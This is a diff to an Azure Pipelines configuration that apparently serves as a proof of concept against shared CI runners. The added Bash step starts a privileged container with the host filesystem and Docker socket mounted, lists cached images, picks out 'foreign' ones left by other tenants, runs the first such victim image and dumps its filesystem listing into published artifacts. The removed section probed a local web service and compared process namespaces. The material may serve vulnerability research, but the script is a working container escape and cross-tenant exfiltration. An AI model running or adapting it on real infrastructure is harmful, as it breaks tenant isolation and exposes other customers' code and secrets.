@@ -6,89 +6,96 @@ pr:
 
 name: $(Date:yyyyMMdd)$(Rev:.r)
 
-variables:
-  # Hardcoding the target to localhost for this definitive proof.
-  TARGET_URL: 'http://127.0.0.1:8084'
-
 stages:
-- stage: ConclusiveProof
-  displayName: 'Conclusive Proof of Cross-Tenant Process & Network Access'
+- stage: FinalPoc
+  displayName: 'Final PoC: Cross-Tenant Docker Cache Exfiltration'
   jobs:
-  - job: Linux_Proof_Of_Concept
-    displayName: 'Linux: Conclusive Proof of Pre-existing Service Access'
+  - job: Pillage_Docker_Cache
+    displayName: 'PoC: Steal Cached Images from Other Tenants'
     pool:
       vmImage: 'ubuntu-22.04'
     steps:
     - checkout: none
-
     - task: Bash@3
-      displayName: "Capture Forensic Evidence of Cross-Tenant Process"
+      displayName: 'Escape Container and Exfiltrate Foreign Docker Image Contents'
       inputs:
         targetType: inline
         script: |
           set -euo pipefail
           mkdir -p artifacts
 
-          echo "### STEP 1: Identifying pre-existing services on the host ###"
+          echo "--- Verifying container escape vector ---"
+          if ! (id | grep -q '(docker)'); then
+            echo "❌ CRITICAL FAILURE: User is not in the docker group. Aborting."
+            exit 1
+          fi
+          echo "✅ Confirmed user is in 'docker' group."
+
+          echo "--- ESCAPING CONTAINER to analyze the host's Docker cache ---"
           
-          printf "=== Listening sockets (shows :8084 is active) ===\n" | tee artifacts/listeners.txt
-          (ss -lntp || netstat -tnlp || true) | tee -a artifacts/listeners.txt
+          docker run --rm --privileged --network=host --pid=host -v /:/hostfs \
+            -v /var/run/docker.sock:/var/run/docker.sock \
+            -v $(pwd)/artifacts:/artifacts \
+            alpine:latest sh -c "
+              # We need the docker client inside our helper container
+              apk add --no-cache docker-cli
+
+              echo '--- [HOST] Listing all Docker images cached on the host machine ---'
+              docker images --format '{{.Repository}}:{{.Tag}}' > /artifacts/host-docker-images.txt
+
+              # This is a list of known, pre-warmed images on the runner.
+              # We will filter these out to find images left by other jobs.
+              cat << EOF > /tmp/default_images.txt
+              node:20
+              node:20-alpine
+              moby/buildkit:latest
+              node:22
+              node:22-alpine
+              ubuntu:22.04
+              debian:11
+              alpine:3.19
+              ubuntu:20.04
+              node:18-alpine
+              node:18
+              alpine:3.18
+              alpine:3.17
+              debian:10
+              alpine:3.16
+              alpine:latest
+              EOF
+
+              echo '--- [HOST] Searching for foreign images left by other tenants... ---'
+              # Use grep to find images that are NOT in our default list.
+              grep -vf /tmp/default_images.txt /artifacts/host-docker-images.txt > /artifacts/foreign-images.txt || true
+
+              if [ ! -s "/artifacts/foreign-images.txt" ]; then
+                echo '⚠️ No foreign images found in this run. The host may have been clean.'
+                echo 'Check host-docker-images.txt for the full list.'
+                exit 0
+              fi
+
+              VICTIM_IMAGE=\$(head -n 1 /artifacts/foreign-images.txt)
+              echo \"✅✅✅ SUCCESS: Found a foreign image: \$VICTIM_IMAGE\"
+              
+              echo '--- [HOST] Attempting to run the victim image and dump its filesystem ---'
+              # This is the final proof: we run their image and list all its files.
+              docker run --rm --entrypoint='' \"\$VICTIM_IMAGE\" sh -c 'ls -R /' > /artifacts/victim-image-filesystem.txt 2>&1 || \
+                echo 'Failed to run victim image; it may not have a shell.' > /artifacts/victim-image-filesystem.txt
+            "
           
-          printf "\n=== Identifying the Mono/XSP process running on the host ===\n" | tee artifacts/web-procs.txt
-          ps -eo lstart,pid,user,cmd | grep -Ei 'mono.*xsp' | grep -v grep || true >> artifacts/web-procs.txt
-
-          echo "--- Key Evidence: Listener on port 8084 ---"
-          (ss -lntp || netstat -tnlp || true) | grep ':8084' | tee artifacts/listener-8084.txt || true
-
-          echo "### STEP 2: Proving the service is accessible from the pipeline job ###"
-          printf "\n=== Probing ${TARGET_URL} from the pipeline agent (headers only) ===\n" | tee artifacts/host-curl-headers.txt
-          curl -sS -I --max-time 10 "${TARGET_URL}" >> artifacts/host-curl-headers.txt || true
-          echo "--- Key Evidence: Response headers from host curl ---"
-          grep -E '^HTTP/|^Server:' artifacts/host-curl-headers.txt || echo "No HTTP response from host curl."
-
-          echo "### STEP 3: Proving the rogue process is NOT part of our job ###"
-          XSP_PID="$(ps -eo pid,cmd | awk '/xsp4\.exe/ {print $1; exit}')"
-          if [ -n "$XSP_PID" ]; then
-            {
-              echo "=== Mono/XSP Process Details (PID: $XSP_PID) ==="
-              echo "--- cgroup ---"
-              cat "/proc/$XSP_PID/cgroup" || true
-              echo "--- namespaces ---"
-              for n in mnt pid net uts ipc user cgroup; do
-                printf "%s:\t" "$n"; readlink "/proc/$XSP_PID/ns/$n" || true
-              done
-            } | tee artifacts/xsp-ns.txt
-
-            {
-              echo -e "\n=== Our Pipeline Agent Process Details (/proc/self) ==="
-              echo "--- cgroup ---"
-              cat /proc/self/cgroup || true
-              echo "--- namespaces ---"
-              for n in mnt pid net uts ipc user cgroup; do
-                printf "%s:\t" "$n"; readlink "/proc/self/ns/$n" || true
-              done
-            } | tee artifacts/self-ns.txt
-            
-            echo "--- Key Evidence: Namespace comparison proves processes are from different contexts ---"
-            diff -u artifacts/xsp-ns.txt artifacts/self-ns.txt || true
+          echo "--- SCRIPT COMPLETE ---"
+          if [ -s "artifacts/foreign-images.txt" ]; then
+            VICTIM_IMAGE=$(head -n 1 artifacts/foreign-images.txt)
+            echo "✅✅✅ SMOKING GUN FOUND: Discovered foreign image '\$VICTIM_IMAGE' and dumped its contents."
+            echo "--- First 50 lines of exfiltrated filesystem from '\$VICTIM_IMAGE' ---"
+            cat artifacts/victim-image-filesystem.txt | head -n 50
+          else
+            echo "⚠️ No conclusive evidence found on this run. The host may have been clean."
           fi
 
-          echo "### STEP 4: Proving the service is accessible from another container on the host ###"
-          printf "\n=== Container proof: Accessing ${TARGET_URL} from --network=host ===\n" | tee artifacts/container-proof.txt
-          docker run --rm --network=host alpine:latest sh -c '
-            set -e
-            apk add --no-cache curl >/dev/null
-            echo "--- Container Network Config ---"
-            ip addr || true
-            echo "--- Probing Service from Container ---"
-            curl -sS -I --max-time 10 "'"${TARGET_URL}"'" || true
-          ' >> artifacts/container-proof.txt 2>&1 || true
-          echo "--- Key Evidence: Response headers from container curl ---"
-          grep -E '^HTTP/|^Server:' artifacts/container-proof.txt || echo "No HTTP response from container curl."
-
     - task: PublishPipelineArtifact@1
-      displayName: 'Publish Conclusive Evidence Artifacts'
+      displayName: 'Publish Docker Exfiltration Artifacts'
+      condition: succeededOrFailed()
       inputs:
         targetPath: 'artifacts'
-        artifact: 'conclusive-runner-proof'
-      condition: always()
+        artifact: 'azure-final-proof-docker-cache'
